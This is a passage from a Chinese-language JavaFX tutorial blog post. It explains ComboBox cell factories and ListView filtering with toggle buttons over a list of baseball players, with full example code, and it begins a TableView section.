class="line">        saveButton.setOnAction( (evt) -&gt; &#123;  </span><br><span class="line">            <span class="keyword">if</span>( account.getValue().equals(EMPTY_PAIR) ) &#123;  </span><br><span class="line">                System.out.println(<span class="string">&quot;no save needed; no item selected&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                System.out.println(<span class="string">&quot;saving &quot;</span> + account.getValue());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;CombosApp&quot;</span>);  </span><br><span class="line">        primaryStage.setScene( scene );  </span><br><span class="line">        primaryStage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initCombo</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        List&lt;Pair&lt;String,String&gt;&gt; accounts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">        accounts.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Auto Expense&quot;</span>, <span class="string">&quot;60000&quot;</span>) );  </span><br><span class="line">        accounts.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Interest Expense&quot;</span>, <span class="string">&quot;61000&quot;</span>) );  </span><br><span class="line">        accounts.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Office Expense&quot;</span>, <span class="string">&quot;62000&quot;</span>) );  </span><br><span class="line">        accounts.add( <span class="keyword">new</span> <span class="title class_">Pair</span>&lt;&gt;(<span class="string">&quot;Salaries Expense&quot;</span>, <span class="string">&quot;63000&quot;</span>) );  </span><br><span class="line">  </span><br><span class="line">        account.getItems().add( EMPTY_PAIR );  </span><br><span class="line">        account.getItems().addAll( accounts );  </span><br><span class="line">        account.setValue( EMPTY_PAIR );  </span><br><span class="line">  </span><br><span class="line">        Callback&lt;ListView&lt;Pair&lt;String,String&gt;&gt;, ListCell&lt;Pair&lt;String,String&gt;&gt;&gt; factory =  </span><br><span class="line">            (lv) -&gt;  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ListCell</span>&lt;Pair&lt;String,String&gt;&gt;() &#123;  </span><br><span class="line">                        <span class="meta">@Override</span>  </span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">updateItem</span><span class="params">(Pair&lt;String, String&gt; item, <span class="type">boolean</span> empty)</span> &#123;  </span><br><span class="line">                            <span class="built_in">super</span>.updateItem(item, empty);  </span><br><span class="line">                            <span class="keyword">if</span>( empty ) &#123;  </span><br><span class="line">                                setText(<span class="string">&quot;&quot;</span>);  </span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                                setText( item.getKey() );  </span><br><span class="line">                            &#125;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;;  </span><br><span class="line">  </span><br><span class="line">        account.setCellFactory( factory );  </span><br><span class="line">        account.setButtonCell( factory.call( <span class="literal">null</span> ) );  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CellFactory"><a href="#CellFactory" class="headerlink" title="CellFactory"></a>CellFactory</h3><p>initCombo（）方法将几个费用帐户添加到<code>List</code>中。 在添加空的<code>List</code>对象之后，此<code>ComboBox</code>被添加到<code>Pair</code>项。 初始值设置为EMPTY_PAIR，它是一个常量。</p>
<p>如果没有指定，<code>ComboBox</code>将使用对象的toString（）方法（在本文中，是一个<code>Pair</code>）来呈现一个后台对象。 对于字符串，例如”是”或”否”选择，不需要额外的代码。 然而，<code>Pair</code>的toString（）将输出人类可读的键和机器首选的值。 此<code>ComboBox</code>的要求是在显示器中仅使用人类可读的键。</p>
<p>为此，提供了一个cellFactory，它将配置一个以<code>ListCell</code>键为内容的<code>Pair</code>对象。 <code>Callback</code>类型是冗长的，但工厂的要点是在匿名内部类的updateItem（）方法中设置<code>ListCell</code>的文本。 请注意，必须调用超类方法。</p>
<p><code>Callback</code>在setButtonCell（）方法中用于为编辑控件提供单元格。 请注意，此程序不可编辑，这是默认设置。 但是，需要factory.call（null），否则只有弹出菜单的内容将被正确格式化，控件的视图将返回到toString（）。<br>本文介绍了<code>ComboBox</code>的一个简单用法。 由于此控件不可编辑，因此可以替换<code>ChoiceBox</code>。 对于不可编辑的图形渲染（例如状态值的颜色编码形状），仍然需要<code>ComboBox</code>来定义控件中使用的特定<code>Node</code>。</p>
<h2 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h2><h3 id="JavaFX中的ListView-Filtering"><a href="#JavaFX中的ListView-Filtering" class="headerlink" title="JavaFX中的ListView Filtering"></a>JavaFX中的ListView Filtering</h3><p>本文演示了如何在JavaFX应用程序中过滤ListView。 应用程序管理两个列表。 一个列表包含数据模型中的所有项。 第二个列表包含当前正在查看的项目。 作为过滤器存储的比较逻辑碎片在两者之间进行调解。<br>大量使用绑定来保持数据结构与用户选择的内容同步。<br>这个屏幕截图显示了应用程序，它包含一个设置过滤器的ToggleView的顶行和一个包含对象的ListView。</p>
<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>该程序以一个域模型Player和一个Player对象数组开始。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Player</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String team;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String playerName;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Player</span><span class="params">(String team, String playerName)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.team = team;</span><br><span class="line">		<span class="built_in">this</span>.playerName = playerName;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getTeam</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> team;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getPlayerName</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> playerName;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> playerName + <span class="string">&quot; (&quot;</span> + team + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Player类包含一对字段：team和playerName。 提供了toString（），以便在将对象添加到ListView（稍后介绍）时，不需要自定义ListCell类。<br>这个例子的测试数据是美国棒球运动员的列表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Player[] players = &#123;<span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;David Ortiz&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Jackie Bradley Jr.&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Xander Bogarts&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Mookie Betts&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;HOU&quot;</span>, <span class="string">&quot;Jose Altuve&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;HOU&quot;</span>, <span class="string">&quot;Will Harris&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Max Scherzer&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Bryce Harper&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Daniel Murphy&quot;</span>),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Wilson Ramos&quot;</span>) &#125;;</span><br></pre></td></tr></table></figure>
<h4 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h4><p>如本文开头所述，ListView过滤主要围绕两个列表的管理。 所有对象都存储在包装的ObservableList playersProperty中，当前可见的对象存储在包装的FilteredList，viewablePlayersProperty中。 viewablePlayersProperty是基于playersProperty构建的，因此对符合FilteredList条件的播放器进行的更新也会对viewablePlayers进行更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ReadOnlyObjectProperty&lt;ObservableList&lt;Player&gt;&gt; playersProperty =</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">SimpleObjectProperty</span>&lt;&gt;(FXCollections.observableArrayList());</span><br><span class="line"></span><br><span class="line">ReadOnlyObjectProperty&lt;FilteredList&lt;Player&gt;&gt; viewablePlayersProperty =</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">SimpleObjectProperty</span>&lt;FilteredList&lt;Player&gt;&gt;(</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">FilteredList</span>&lt;&gt;(playersProperty.get()</span><br><span class="line">						));</span><br></pre></td></tr></table></figure>
<p>filterProperty（）是一种方便，允许调用者绑定到底层Predicate。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectProperty&lt;Predicate&lt;? <span class="built_in">super</span> Player&gt;&gt; filterProperty =</span><br><span class="line">	viewablePlayersProperty.get().predicateProperty();</span><br></pre></td></tr></table></figure>
<p>UI根是一个VBox，其中包含一个ToggleView的HBox和一个ListView。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VBox</span> <span class="variable">vbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VBox</span>();</span><br><span class="line">vbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>));</span><br><span class="line">vbox.setSpacing(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HBox</span> <span class="variable">hbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();</span><br><span class="line">hbox.setSpacing( <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line"><span class="type">ToggleGroup</span> <span class="variable">filterTG</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleGroup</span>();</span><br></pre></td></tr></table></figure>
<h4 id="Filtering-Action"><a href="#Filtering-Action" class="headerlink" title="Filtering Action"></a>Filtering Action</h4><p>一个处理程序被附加到ToggleList中，它将修改filterProperty。 每个ToggleButton都在userData字段中提供一个Predicate。 toggle设置filter属性时使用提供的Predicate。 这段代码设置了“全部显示”ToggleButton的特殊情况。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">EventHandler&lt;ActionEvent&gt; toggleHandler = (event) -&gt; &#123;</span><br><span class="line">		<span class="type">ToggleButton</span> <span class="variable">tb</span> <span class="operator">=</span> (ToggleButton)event.getSource();</span><br><span class="line">	    Predicate&lt;Player&gt; filter = (Predicate&lt;Player&gt;)tb.getUserData();</span><br><span class="line">	    filterProperty.set( filter );</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ToggleButton</span> <span class="variable">tbShowAll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleButton</span>(<span class="string">&quot;Show All&quot;</span>);</span><br><span class="line">tbShowAll.setSelected(<span class="literal">true</span>);</span><br><span class="line">tbShowAll.setToggleGroup( filterTG );</span><br><span class="line">tbShowAll.setOnAction(toggleHandler);</span><br><span class="line">tbShowAll.setUserData( (Predicate&lt;Player&gt;) (Player p) -&gt; <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>筛选特定团队的切换表是在运行时基于Players数组创建的。 此Stream执行以下操作。</p>
<ol>
<li>将球员列表提取为团队字符串的不同列表</li>
<li>为每个团队创建一个ToggleButton字符串</li>
<li>为每个要用作过滤器的ToggleButton设置谓词</li>
<li>收集Toggle标签以添加到HBox容器中<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;ToggleButton&gt; tbs = Arrays.asList( players)</span><br><span class="line">		.stream()</span><br><span class="line">		.map( (p) -&gt; p.getTeam() )</span><br><span class="line">		.distinct()</span><br><span class="line">		.map( (team) -&gt; &#123;</span><br><span class="line">			<span class="type">ToggleButton</span> <span class="variable">tb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleButton</span>( team );</span><br><span class="line">			tb.setToggleGroup( filterTG );</span><br><span class="line">			tb.setOnAction( toggleHandler );</span><br><span class="line">			tb.setUserData( (Predicate&lt;Player&gt;) (Player p) -&gt; team.equals(p.getTeam()) );</span><br><span class="line">			<span class="keyword">return</span> tb;</span><br><span class="line">		&#125;)</span><br><span class="line">		.collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">hbox.getChildren().add( tbShowAll );</span><br><span class="line">hbox.getChildren().addAll( tbs );</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="ListView-1"><a href="#ListView-1" class="headerlink" title="ListView"></a>ListView</h4><p>下一步将创建ListView并将ListView绑定到viewablePlayersProperty。 这使ListView能够根据更改的筛选器接收更新。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ListView&lt;Player&gt; lv = <span class="keyword">new</span> <span class="title class_">ListView</span>&lt;&gt;();</span><br><span class="line">lv.itemsProperty().bind( viewablePlayersProperty );</span><br></pre></td></tr></table></figure>
<p>程序的其余部分创建场景并显示舞台。 onShown将数据集加载到playersProperty和viewablePlayersProperty列表中。 尽管在这个程序的特殊版本中，两个列表是同步的，但是如果股票过滤器与”无过滤器”完全不同，则不需要修改此代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">vbox.getChildren().addAll( hbox, lv );</span><br><span class="line"></span><br><span class="line"><span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);</span><br><span class="line"></span><br><span class="line">primaryStage.setScene( scene );</span><br><span class="line">		primaryStage.setOnShown((evt) -&gt; &#123;</span><br><span class="line">			playersProperty.get().addAll( players );</span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">primaryStage.show();</span><br></pre></td></tr></table></figure>
<p>本文使用绑定将可查看的Player对象列表绑定到ListView。 当选择切换按钮时，可查看的播放器被更新。 这个选择应用了一个过滤器到一个完整的播放器集，它被单独维护为一个过滤列表。 绑定用于保持UI同步，并允许在设计中分离关注点。</p>
<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.ObjectProperty;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.ReadOnlyObjectProperty;  </span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.SimpleObjectProperty;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.FXCollections;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.ObservableList;  </span><br><span class="line"><span class="keyword">import</span> javafx.collections.transformation.FilteredList;  </span><br><span class="line"><span class="keyword">import</span> javafx.event.ActionEvent;  </span><br><span class="line"><span class="keyword">import</span> javafx.event.EventHandler;  </span><br><span class="line"><span class="keyword">import</span> javafx.geometry.Insets;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.ListView;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.ToggleButton;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.control.ToggleGroup;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.HBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.VBox;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.function.Predicate;  </span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterListApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// 创建测试数据  </span></span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       Player[] players = &#123;<span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;David Ortiz&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Jackie Bradley Jr.&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Xander Bogarts&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;BOS&quot;</span>, <span class="string">&quot;Mookie Betts&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;HOU&quot;</span>, <span class="string">&quot;Jose Altuve&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;HOU&quot;</span>, <span class="string">&quot;Will Harris&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Max Scherzer&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Bryce Harper&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Daniel Murphy&quot;</span>),  </span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">Player</span>(<span class="string">&quot;WSH&quot;</span>, <span class="string">&quot;Wilson Ramos&quot;</span>) &#125;;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// 设置模型，该模型是两个玩家列表和一个筛选条件  </span></span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       ReadOnlyObjectProperty&lt;ObservableList&lt;Player&gt;&gt; playersProperty =  </span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">SimpleObjectProperty</span>&lt;&gt;(FXCollections.observableArrayList());  </span><br><span class="line">  </span><br><span class="line">       ReadOnlyObjectProperty&lt;FilteredList&lt;Player&gt;&gt; viewablePlayersProperty =  </span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">SimpleObjectProperty</span>&lt;FilteredList&lt;Player&gt;&gt;(  </span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">FilteredList</span>&lt;&gt;(playersProperty.get()  </span><br><span class="line">                         ));  </span><br><span class="line">  </span><br><span class="line">       ObjectProperty&lt;Predicate&lt;? <span class="built_in">super</span> Player&gt;&gt; filterProperty =  </span><br><span class="line">          viewablePlayersProperty.get().predicateProperty();  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// 构建 UI       //       VBox vbox = new VBox();  </span></span><br><span class="line">       vbox.setPadding( <span class="keyword">new</span> <span class="title class_">Insets</span>(<span class="number">10</span>));  </span><br><span class="line">       vbox.setSpacing(<span class="number">4</span>);  </span><br><span class="line">  </span><br><span class="line">       <span class="type">HBox</span> <span class="variable">hbox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HBox</span>();  </span><br><span class="line">       hbox.setSpacing( <span class="number">2</span> );  </span><br><span class="line">  </span><br><span class="line">       <span class="type">ToggleGroup</span> <span class="variable">filterTG</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleGroup</span>();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// toggleHandler 操作将根据所选的 TB 设置筛选器  </span></span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">       EventHandler&lt;ActionEvent&gt; toggleHandler = (event) -&gt; &#123;  </span><br><span class="line">             <span class="type">ToggleButton</span> <span class="variable">tb</span> <span class="operator">=</span> (ToggleButton)event.getSource();  </span><br><span class="line">              Predicate&lt;Player&gt; filter = (Predicate&lt;Player&gt;)tb.getUserData();  </span><br><span class="line">              filterProperty.set( filter );  </span><br><span class="line">          &#125;;  </span><br><span class="line">  </span><br><span class="line">       <span class="type">ToggleButton</span> <span class="variable">tbShowAll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleButton</span>(<span class="string">&quot;Show All&quot;</span>);  </span><br><span class="line">       tbShowAll.setSelected(<span class="literal">true</span>);  </span><br><span class="line">       tbShowAll.setToggleGroup( filterTG );  </span><br><span class="line">       tbShowAll.setOnAction(toggleHandler);  </span><br><span class="line">       tbShowAll.setUserData( (Predicate&lt;Player&gt;) (Player p) -&gt; <span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// 从 Player 对象创建不同的团队列表，然后创建  </span></span><br><span class="line">       <span class="comment">// ToggleButtons（切换按钮）  </span></span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       List&lt;ToggleButton&gt; tbs = Arrays.asList( players)  </span><br><span class="line">             .stream()  </span><br><span class="line">             .map( (p) -&gt; p.getTeam() )  </span><br><span class="line">             .distinct()  </span><br><span class="line">             .map( (team) -&gt; &#123;  </span><br><span class="line">                <span class="type">ToggleButton</span> <span class="variable">tb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToggleButton</span>( team );  </span><br><span class="line">                tb.setToggleGroup( filterTG );  </span><br><span class="line">                tb.setOnAction( toggleHandler );  </span><br><span class="line">                tb.setUserData( (Predicate&lt;Player&gt;) (Player p) -&gt; team.equals(p.getTeam()) );  </span><br><span class="line">                <span class="keyword">return</span> tb;  </span><br><span class="line">             &#125;)  </span><br><span class="line">             .collect(Collectors.toList());  </span><br><span class="line">  </span><br><span class="line">       hbox.getChildren().add( tbShowAll );  </span><br><span class="line">       hbox.getChildren().addAll( tbs );  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">//  </span></span><br><span class="line">       <span class="comment">// 创建绑定到 viewablePlayers 属性的 ListView       //       ListView&lt;Player&gt; lv = new ListView&lt;&gt;();  </span></span><br><span class="line">       lv.itemsProperty().bind( viewablePlayersProperty );  </span><br><span class="line">  </span><br><span class="line">       vbox.getChildren().addAll( hbox, lv );  </span><br><span class="line">  </span><br><span class="line">       <span class="type">Scene</span> <span class="variable">scene</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scene</span>(vbox);  </span><br><span class="line">  </span><br><span class="line">       primaryStage.setScene( scene );  </span><br><span class="line">       primaryStage.setOnShown((evt) -&gt; &#123;  </span><br><span class="line">          playersProperty.get().addAll( players );  </span><br><span class="line">       &#125;);  </span><br><span class="line">  </span><br><span class="line">       primaryStage.show();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">       launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Player</span> &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> String team;  </span><br><span class="line">       <span class="keyword">private</span> <span class="keyword">final</span> String playerName;  </span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">Player</span><span class="params">(String team, String playerName)</span> &#123;  </span><br><span class="line">          <span class="built_in">this</span>.team = team;  </span><br><span class="line">          <span class="built_in">this</span>.playerName = playerName;  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">public</span> String <span class="title function_">getTeam</span><span class="params">()</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> team;  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">public</span> String <span class="title function_">getPlayerName</span><span class="params">()</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> playerName;  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="meta">@Override</span>  </span><br><span class="line">       <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> playerName + <span class="string">&quot; (&quot;</span> + team + <span class="string">&quot;)&quot;</span>; &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="/image/Pasted image 20240430163242.png" alt="20240430163242.png" /></p>
<h2 id="TableView"><a href="#TableView" class="headerlink" title="TableView"></a>TableView</h2><p>对于JavaFX业务应用程序，<code>TableView</code>是一个必不可少的控件。 当您需要在扁平的行&#x2F;列结构中显示多个记录时，请使用<code>TableView</code>。 此示例显示了<code>TableView</code>的基本元素，并演示了应用JavaFX绑定时组件的强大功能。<br>演示应用程序是一个<code>TableView</code>和Buttons的pair。 <code>TableView</code>有四个表列：价格，项目，价格，税收。 <code>TableView</code>在三行中显示三个对象：机械键盘，产品键盘，O型环。<br>禁用的逻辑取决于<code>TableView</code>中的选择。 最初，没有选择任何项目，因此两个选项都被禁用。 如果选择了任何项目（以下屏幕截图中的第一个项目），则会启用库存<code>Button</code>。     还启用了Tax <code>Button</code>，但这需要咨询Tax值。<br>如果所选项目的Tax值为false，则Tax <code>Button</code>将被禁用。 此屏幕截图显示了选定的第二个项目。 库存<code>Button</code>已启用，但税<code>Button</code>未启用。</p>
<h3 id="模型及声明"><a href="#模型及声明" class="headerlink" title="模型及声明"></a>模型及声明</h3><p><code>TableView</code>是基于一个称为Item的POJO模型。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Item</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String sku;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String descr;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Float price;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Boolean taxable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Item</span><span class="params">(String sku, String descr, Float price, Boolean taxable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sku = sku;</span><br><span class="line">        <span class="built_in">this</span>.descr = descr;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">        <span class="built_in">this</span>.taxable = taxable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSku</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sku;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDescr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> descr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Float <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getTaxable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> taxable;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>TableView</code>和<code>TableColumn</code>在声明中使用泛型。 对于<code>TableView</code>，类型参数是Item。 对于TableColumns，类型参数是Item和字段类型。 <code>TableColumn</code>的构造函数接受一个列名。 在本例中，列名与实际字段名略有不同。</p>
